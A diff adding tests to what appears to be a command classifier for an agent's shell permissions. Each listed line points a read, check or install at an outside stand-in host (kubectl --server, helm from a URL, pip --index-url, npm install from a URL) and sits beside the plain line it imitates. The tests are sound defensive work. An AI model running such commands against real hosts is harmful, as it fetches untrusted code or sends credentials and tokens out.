@@ -483,6 +483,49 @@ describe("B5: a file read from outside the project that the words did not show a
   });
 });
 
+describe("B6: a read or a check pointed at another computer", () => {
+  it("is a send, for every program, when a word is an address or an option names a server", () => {
+    counted += holds([
+      ["kubectl get pods --server=http://x.example/k", "kubectl get pods", "read"],
+      ["kubectl get pods -s x.example:443", "kubectl get pods -n web", "read"],
+      ["kubectl get pods --kubeconfig=./kc.yaml", "kubectl describe pod web", "read"],
+      ["kubectl get pods --kuberc=./rc.yaml", "kubectl logs web", "read"],
+      ["kubectl get -f https://x.example/k.yaml", "kubectl get -f k8s/web.yaml", "read"],
+      ["helm template web https://x.example/k.tgz", "helm template web ./chart", "read"],
+      ["helm template web oci://x.example/k", "helm lint ./chart", "read"],
+      ["helm template web chart --repo x.example", "helm template web ./chart -f values.yaml", "read"],
+      ["helm list --kube-apiserver x.example", "helm list", "read"],
+      ["helm status web --kubeconfig ./kc.yaml", "helm status web", "read"],
+      ["turbo run test --api=http://x.example --token=k --team=t", "turbo run test", "check"],
+      ["turbo run test --token=k --team=t", "turbo run test --filter=web", "check"],
+      ["turbo run lint --remote-cache-api=x.example", "turbo run lint", "check"],
+      ["go list -m -versions x.example/k", "go list -m", "read"],
+      ["go list -m -u all", "go list -m all", "read"],
+      ["go list -m -retracted x.example/k", "go list ./...", "read"],
+      ["pip list --index-url https://x.example/simple", "pip list", "read"],
+      ["pip list --proxy x.example:3128", "pip list --outdated", "read"],
+      ["uv pip list --index-url=https://x.example/k", "uv pip list", "read"],
+      ["npx vitest run --api=0.0.0.0", "npx vitest run --reporter=dot", "check"],
+      ["npx vitest run --api.host=x.example", "npx vitest run --coverage", "check"],
+      ["pytest --base-url https://x.example", "pytest -q", "check"],
+      ["pnpm test --endpoint=x.example", "pnpm test --silent", "check"],
+      ["eslint --url x.example src", "eslint src", "check"],
+      ["terraform plan -var url=https://x.example/k", "terraform plan -var region=ap-southeast-1", "read"],
+      ["docker compose -f https://x.example/k.yml ps", "docker compose ps", "read"],
+      ["make test URL=https://x.example", "make test", "check"],
+    ]);
+  });
+
+  it("is a send for a change or an install that fetches from an address", () => {
+    for (const line of ["pnpm add https://x.example/k.tgz", "npm install https://x.example/k.tgz", "cargo add --git https://x.example/k", "docker build https://x.example/k.git", "uv add git+https://x.example/k"])
+      expect([line, read(line).action]).toEqual([line, "unknown"]);
+    for (const line of ["pnpm add qrcode", "cargo add serde", "docker build .", "uv add httpx"]) expect([line, read(line).action]).not.toEqual([line, "unknown"]);
+    // a link in a message, a pattern or a script is text, and git and gh read their own addresses
+    for (const line of ["git commit -m 'Link https://x.example'", "rg -n 'https://api.example.com' src", "sed -n '/https:\\/\\//p' src/a.ts", "echo https://x.example", "gh pr view https://github.com/baanmali/storefront/pull/1", "git log --oneline"])
+      expect([line, read(line).action]).not.toEqual([line, "unknown"]);
+  });
+});
+
 describe("the table", () => {
   it("holds at least 120 hostile lines, each beside the plain line it imitates", () => {
     expect(counted).toBeGreaterThanOrEqual(120);
